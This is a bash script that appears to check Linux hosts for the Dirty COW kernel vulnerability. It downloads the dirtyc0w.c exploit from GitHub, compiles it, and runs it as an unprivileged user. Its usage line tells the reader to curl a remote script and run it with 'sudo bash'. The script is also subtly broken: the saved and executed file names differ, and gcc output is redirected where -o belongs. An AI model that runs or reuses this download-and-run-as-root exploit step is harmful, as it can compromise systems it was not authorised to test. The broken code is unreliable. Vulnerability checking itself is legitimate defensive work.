#!/usr/bin/env bash
USAGE="\
curl -s https://raw.githubusercontent.com/kiorky/dirtyc0w/master/dirtyc0w/dirtycow.sh>dirtycow_asroot.sh;\
cat dirtyc0w_asroot.sh;\
echo press_enter;read;sudo bash dirtyc0w_asroot.sh
"
set -x
tmp="$(mktemp)"
src="$(pwd)/dirtyc0w.c"
bin=/dirtyc0w$(basename $tmp)
f=$tmp/m00m00
input=m00000000000000000
if [ ! -e "$src" ];then
    curl \
    https://raw.githubusercontent.com/kiorky/scripts/master/dirtyc0w/dirtyc0w.c \
    > "$src"
fi
if [[ -n "$tmp" ]] && [ -e "$tmp" ];then
    rm -rf "$tmp"
    mkdir "$tmp"
    cd "$tmp"
    chmod 2777 "${tmp}"
    rm -f "$f"
    touch "${f}"
    gcc -pthread "$src" > "$bin"
    su -s /bin/bash -l nobody "$bin" "$f" "$input"
    if grep -q "$input" "$f";then
        echo vuln
        ret=455
    else
        echo nonvuln
        ret=0
    fi
else
    ret=1
fi
rm -rf "${bin}" "${tmp}"
exit $ret
# vim:set et sts=4 ts=4 tw=80:
